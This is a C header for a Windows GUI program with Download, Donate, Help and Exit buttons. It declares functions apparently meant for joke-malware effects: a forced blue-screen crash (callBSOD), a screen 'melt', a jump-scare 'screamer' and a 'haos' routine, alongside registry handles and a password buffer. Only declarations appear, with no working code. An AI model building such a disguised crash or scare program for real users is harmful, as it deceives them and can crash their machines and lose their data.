#pragma once
#include <Windows.h>

#define OnHelpClicked		1
#define OnDownloadClicked	2
#define OnOpenClicked		3
#define OnDonateClicked		4
#define OnExitClicked		5
#define OnReadModeClicked	6

#define DownloadBtnWidth	230
#define DownloadBtnHeight	160

#define DonateBtnWidth	230
#define DonateBtnHeight	50

#define ExitBtnWidth	100
#define ExitBtnHeight	50

#define HelpBtnWidth	100
#define HelpBtnHeight	50

#define SIZE_STR 1 << 8
#define PATH L"C:\\Program Files"
#define RUS 0x0419
#define ENG 0x0409

#define BufferSize	16

char Buffer[BufferSize];
char password[];

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
TCHAR WinName[] = _T("MainFrame");

RECT wndRect;
RECT fontRect;
PAINTSTRUCT ps;
HBRUSH hBrush;
HFONT hDownloadFont;
HFONT hFont;
HFONT hDefaultFont;
HDC hdc;
POINT pCursor;

HWND hDownload;
HWND hInfo;
HWND hDonate;
HWND hExit;
HWND hMode;
HWND hReadMode;

HWND hBrowser;

void MainWndAddMenus(HWND hWnd);
void MainWndVidgetes(HWND hWnd);
void draw(HDC hdc);
void FontApply();
void drawScreamer(HDC hdc);
int callBSOD(int argc, _TCHAR* argv[]);
void haos();

int srcWidth;
int srcHeitght;
int interval = 20;

LRESULT	CALLBACK Melt(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK Screamer(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

int APIENTRY CallMelt(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int showCmd);
int APIENTRY CallScreamer(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int showCmd);

int message;

HKEY hKey;
HKEY tmp;